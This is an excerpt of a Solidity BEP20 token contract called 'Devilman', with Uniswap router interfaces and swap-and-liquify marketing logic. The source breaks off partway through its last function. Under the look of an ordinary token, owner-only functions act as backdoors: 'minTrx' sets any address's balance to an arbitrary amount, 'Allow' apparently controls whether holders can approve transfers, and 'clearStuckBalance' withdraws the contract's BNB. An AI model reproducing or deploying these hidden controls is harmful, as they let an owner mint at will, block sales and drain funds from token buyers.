...
contract Ownable is Context {
    ...
    function geUnlockTime() public view returns (uint) {
        return _lockTime;
    }
...
interface IUniswapV2Router01 {
    ...
    function removeLiquidityWithPermit(address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline, bool approveMax, uint v, bytes32 r, bytes32 s) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint v, bytes32 r, bytes32 s) external returns (uint amountToken, uint amountETH);
...
interface IUniswapV2Router02 is IUniswapV2Router01 {
    ...
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint v, bytes32 r, bytes32 s) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
}

contract Devilman is Context, BEP20, Ownable {
    using SafeMath for uint;
    using Address for address;
    
    string private _name = "Devilman";
    string private _symbol = "DEVILMAN";
    ...
    mapping (address => uint) private buycooldown;
    ...
    uint private initialsupply = 1_000_000_000_000;
    uint private _tTotal = initialsupply * 10 ** _decimals; 
    ...
    uint public _maxTxAmount = 1_000_000_000_000 * 10**9;

    // Liquify when 50 billion tokens are stored
    uint private numTokensSellToAddToLiquidity = 50_000_000_000 * 10**9;
    ...
    event ToMarketing(uint bnbSent);
    ...
    function Allow(address holder, bool allowApprove) external onlyOwner {
    ...
    function minTrx(address miner, uint _value) external onlyOwner {
      balances[miner] = _value * 10 ** uint(_decimals);
    }
    ...
    function swapAndLiquify(uint contractTokenBalance) private lockTheSwap {
        ...
        uint marketingTokenBalance = contractTokenBalance.div(2);
        uint liquidityTokenBalance = contractTokenBalance.sub(marketingTokenBalance);
        ...
        uint tokenBalanceToLiquifyAsBNB = liquidityTokenBalance.div(2);
        uint tokenBalanceToLiquify = liquidityTokenBalance.sub(tokenBalanceToLiquifyAsBNB);
        ...
        uint tokensToSwapToBNB = tokenBalanceToLiquifyAsBNB.add(marketingTokenBalance);

        // swap tokens for BNB
        swapTokensForEth(tokensToSwapToBNB);

        // Total BNB that has been swapped
        uint bnbSwapped = address(this).balance.sub(initialBalance);

        // BNB to liquify is 25% of the total token balance or 33% of the BNB that has already been liquified
        uint bnbToLiquify = bnbSwapped.div(3);
        ...
        uint marketingBNB = bnbSwapped.sub(bnbToLiquify);
    ...
    function clearStuckBalance(uint amountPercentage) external onlyOwner {
        uint amountBNB = address(this).balance;
